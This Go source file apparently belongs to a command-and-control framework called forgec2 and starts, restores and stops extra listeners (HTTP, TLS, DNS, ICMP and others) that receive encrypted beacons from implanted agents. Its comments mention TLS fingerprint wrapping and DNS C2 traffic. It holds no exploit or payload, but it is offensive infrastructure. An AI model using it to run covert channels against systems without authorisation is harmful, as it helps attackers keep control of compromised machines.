package server

import (
	"crypto/tls"
	"encoding/json"
	"fmt"
	"log/slog"
	"net"
	"net/http"
	"runtime/debug"
	"time"

	"github.com/forgec2/forgec2/internal/db"
)

// ── DB-backed extra listeners (http/tcp/tls/dns/icmp/ssh/h2c/quic/udp) ─────

// startExtraListenersFromDB starts extra listeners for all enabled listeners
// stored in the database. Called at server startup.
func (s *Server) startExtraListenersFromDB() {
	var listeners []db.Listener
	// Load all enabled listeners (DNS/ICMP are loaded from DB too now)
	if err := s.db.Find(&listeners, "enabled = ?", true).Error; err != nil {
		slog.Error("Failed to load listeners from DB", "err", err)
		return
	}
	for _, l := range listeners {
		scheme := l.Scheme
		if scheme == "" {
			scheme = l.Type
		}
		key := listenerKey(&l)

		// For HTTP/TCP, skip if this is the main server address
		if scheme == "http" || scheme == "https" || scheme == "tcp" || scheme == "tls" {
			addr := l.Host + ":" + itoa(l.Port)
			mainAddr := s.cfg.Server.Host + ":" + itoa(s.cfg.Server.Port)
			if addr == mainAddr {
				slog.Debug("Skipping extra listener — matches main server address", "key", key)
				continue
			}
			// Check port availability
			if !isPortAvailable(l.Host, l.Port) {
				slog.Warn("Port not available for extra listener, skipping", "key", key, "addr", addr)
				continue
			}
		}

		slog.Info("Restoring extra listener from DB", "key", key, "scheme", scheme)
		if err := s.startExtraListener(key, scheme); err != nil {
			slog.Error("Failed to start extra listener from DB", "key", key, "err", err)
		}
	}
}

// makeBeaconHandler creates a closure that wraps processBeacon for listener callbacks.
// It enforces the same beacon_key auth and ECDH envelope semantics as the HTTP
// beacon handler, so no listener transport (DNS, ICMP, gRPC, TCP) can bypass
// authentication or downgrade to plaintext when ECDH is forced.
func (s *Server) makeBeaconHandler() func(string, []byte) []byte {
	return s.handleListenerBeacon
}

// handleListenerBeacon processes a beacon envelope received over a non-HTTP
// listener. It decodes/authenticates the envelope the same way as the HTTP
// handler (protocol v2: timestamp window, seq replay window, ECDH/AES-256-GCM
// ciphertext, authenticated handshake/registration frames) and builds the
// response with matching encryption semantics.
func (s *Server) handleListenerBeacon(agentID string, reqJSON []byte) []byte {
	raw := reqJSON
	if len(raw) == 0 {
		// No embedded payload: minimal envelope with just the UUID
		env, err := json.Marshal(map[string]string{"uuid": agentID})
		if err != nil {
			return nil
		}
		raw = env
	}

	env, req, kind := s.decodeBeaconEnvelope(raw)
	if kind == frameRejected {
		return nil
	}
	if req.UUID == "" {
		req.UUID = agentID
	}
	var respJSON []byte
	if kind == frameEncrypted {
		resp := s.processBeacon(req, "")
		if s.sessionManager.NeedsRekey(req.UUID, BeaconSessionRekeyMessages) {
			resp.Rekey = true
		}
		var ok bool
		respJSON, ok = s.buildBeaconResponse(req.UUID, env.Seq, resp)
		if !ok {
			return nil
		}
	} else {
		var ok bool
		respJSON, ok = s.processAuthFrame(env, kind)
		if !ok {
			return nil
		}
	}
	return respJSON
}

// startExtraListener starts an additional listener for the given scheme and key.
// The limit check reserves a placeholder under lock to prevent concurrent
// callers from both passing the check and exceeding the limit.
func (s *Server) startExtraListener(key, scheme string) error {
	s.extraListenersMu.Lock()
	if len(s.extraListeners) >= MaxExtraListeners {
		s.extraListenersMu.Unlock()
		return fmt.Errorf("extra listener limit reached (%d)", MaxExtraListeners)
	}
	// Reject a duplicate key that already owns a running listener, otherwise
	// a concurrent POST with the same key would overwrite it and leak the
	// previously bound socket.
	if existing := s.extraListeners[key]; existing != nil {
		s.extraListenersMu.Unlock()
		return fmt.Errorf("listener already running for key %q", key)
	}
	// Reserve placeholder to make the limit check atomic with insertion.
	// Only reserve when there is no existing (possibly still-starting) entry.
	if _, exists := s.extraListeners[key]; !exists {
		s.extraListeners[key] = nil
	}
	s.extraListenersMu.Unlock()
	var err error
	defer func() {
		if err != nil {
			s.extraListenersMu.Lock()
			if s.extraListeners[key] == nil {
				delete(s.extraListeners, key)
			}
			s.extraListenersMu.Unlock()
		}
	}()

	switch scheme {
	case "http", "https":
		err = s.startExtraHTTPListener(key, scheme)
		return err
	case "tcp", "tls":
		err = s.startExtraTCPListener(key, scheme)
		return err
	case "dns":
		err = s.startExtraDNSListener(key)
		return err
	case "icmp":
		err = s.startExtraICMPListener(key)
		return err
	case "h2c":
		err = s.startExtraH2CListener(key)
		return err
	case "quic":
		err = s.startExtraQUICListener(key)
		return err
	case "udp":
		err = s.startExtraUDPListener(key)
		return err
	default:
		slog.Warn("Unknown extra listener scheme, skipping", "scheme", scheme, "key", key)
		return nil
	}
}

func (s *Server) startExtraHTTPListener(key, scheme string) error {
	// Key format: "http://host:port" or "https://host:port"
	addr := key[len(scheme)+3:] // strip "scheme://"
	srv := &http.Server{
		Addr:              addr,
		Handler:           s.router,
		ReadTimeout:       HTTPReadTimeout,
		ReadHeaderTimeout: 10 * time.Second,
		WriteTimeout:      HTTPWriteTimeout,
		IdleTimeout:       HTTPIdleTimeout,
	}
	s.extraListenersMu.Lock()
	s.extraListeners[key] = srv
	s.extraListenersMu.Unlock()
	s.wg.Add(1)
	go func() {
		defer func() {
			if r := recover(); r != nil {
				slog.Error("recovered from panic", "err", r, "stack", string(debug.Stack()))
			}
		}()
		defer s.wg.Done()
		var err error
		if scheme == "https" {
			// Extra HTTPS listeners share the main server's TLS posture:
			// JARM/JA3 fingerprint wrapping, mTLS requirements and TLS 1.2
			// floor are applied identically to every termination point.
			if cfgErr := s.configureTLS(srv); cfgErr != nil {
				slog.Error("Extra HTTPS listener TLS config failed", "key", key, "addr", addr, "err", cfgErr)
			}
			slog.Info("Extra HTTPS listener started", "addr", addr, "key", key)
			err = srv.ListenAndServeTLS(s.cfg.Server.CertFile, s.cfg.Server.KeyFile)
		} else {
			slog.Info("Extra HTTP listener started", "addr", addr, "key", key)
			err = srv.ListenAndServe()
		}
		if err != nil && err != http.ErrServerClosed {
			slog.Error("Extra HTTP listener error", "key", key, "addr", addr, "err", err)
		}
		s.extraListenersMu.Lock()
		delete(s.extraListeners, key)
		s.extraListenersMu.Unlock()
	}()
	return nil
}

func (s *Server) startExtraTCPListener(key, scheme string) error {
	// Key format: "tcp://host:port" or "tls://host:port"
	addr := key[len(scheme)+3:] // strip "scheme://"
	var ln net.Listener
	var err error
	if scheme == "tls" {
		cert, certErr := tls.LoadX509KeyPair(s.cfg.Server.CertFile, s.cfg.Server.KeyFile)
		if certErr != nil {
			return fmt.Errorf("loading TLS cert for extra TCP listener: %w", certErr)
		}
		tlsCfg := &tls.Config{
			Certificates: []tls.Certificate{cert},
			MinVersion:   tls.VersionTLS12,
		}
		ln, err = tls.Listen("tcp", addr, tlsCfg)
	} else {
		ln, err = net.Listen("tcp", addr)
	}
	if err != nil {
		return fmt.Errorf("starting extra TCP listener: %w", err)
	}

	s.extraListenersMu.Lock()
	s.extraListeners[key] = ln
	s.extraListenersMu.Unlock()

	slog.Info("Extra TCP listener started", "addr", addr, "key", key, "tls", scheme == "tls")
	s.wg.Add(1)
	go func() {
		defer func() {
			if r := recover(); r != nil {
				slog.Error("recovered from panic", "err", r, "stack", string(debug.Stack()))
			}
		}()
		defer s.wg.Done()
		for {
			conn, aErr := ln.Accept()
			if aErr != nil {
				select {
				case <-s.ctx.Done():
					ln.Close()
					s.extraListenersMu.Lock()
					delete(s.extraListeners, key)
					s.extraListenersMu.Unlock()
					return
				default:
				}
				if ne, ok := aErr.(net.Error); ok && ne.Temporary() {
					time.Sleep(50 * time.Millisecond)
					continue
				}
				slog.Error("Extra TCP accept error (listener exiting)", "key", key, "addr", addr, "err", aErr)
				break
			}
			s.wg.Add(1)
			go func() {
				defer s.wg.Done()
				s.handleTCPConnection(conn)
			}()
		}
		ln.Close()
		s.extraListenersMu.Lock()
		delete(s.extraListeners, key)
		s.extraListenersMu.Unlock()
	}()
	return nil
}

func (s *Server) startExtraDNSListener(key string) error {
	// Key format: "dns://domain" — we need to look up the listener record for full config
	var l db.Listener
	if err := s.db.Where("scheme = ? AND dns_domain = ?", "dns", key[6:]).First(&l).Error; err != nil {
		return fmt.Errorf("DNS listener record not found for domain %s: %w", key[6:], err)
	}
	addr := l.DNSListenAddr
	if addr == "" {
		addr = s.cfg.Server.DNSAddr
	}
	if addr == "" {
		addr = ":53"
	}

	dl := NewDNSBeaconListener(l.DNSDomain, l.Host, l.ID, addr)
	dl.SetHandler(s.makeBeaconHandler())

	// Start() binds synchronously and returns the bind error — calling it in
	// a fire-and-forget goroutine meant a port conflict left a dead listener
	// registered as "running", silently dropping all DNS C2 traffic.
	if err := dl.Start(); err != nil {
		return fmt.Errorf("extra DNS listener %s: %w", key, err)
	}

	s.extraListenersMu.Lock()
	s.extraListeners[key] = dl
	s.extraListenersMu.Unlock()

	slog.Info("Extra DNS listener started", "domain", l.DNSDomain, "addr", addr)
	return nil
}

func (s *Server) startExtraICMPListener(key string) error {
	// Key format: "icmp://addr" — we need to look up the listener record for full config
	var l db.Listener
	addrPart := key[7:] // strip "icmp://"
	if err := s.db.Where("scheme = ? AND icmp_addr = ?", "icmp", addrPart).First(&l).Error; err != nil {
		return fmt.Errorf("ICMP listener record not found for addr %s: %w", addrPart, err)
	}
	addr := l.ICMPAddr
	if addr == "" {
		addr = addrPart
	}

	il := NewICMPBeaconListener(addr)
	il.SetHandler(s.makeBeaconHandler())

	if err := il.Start(); err != nil {
		return fmt.Errorf("starting extra ICMP listener: %w", err)
	}

	s.extraListenersMu.Lock()
	s.extraListeners[key] = il
	s.extraListenersMu.Unlock()

	slog.Info("Extra ICMP listener started", "addr", addr)
	return nil
}

// stopExtraListener gracefully stops an extra listener by key.
func (s *Server) stopExtraListener(key string) error {
	s.extraListenersMu.Lock()
	closer, ok := s.extraListeners[key]
	delete(s.extraListeners, key)
	s.extraListenersMu.Unlock()
	if !ok {
		return nil
	}
	return closer.Close()
}
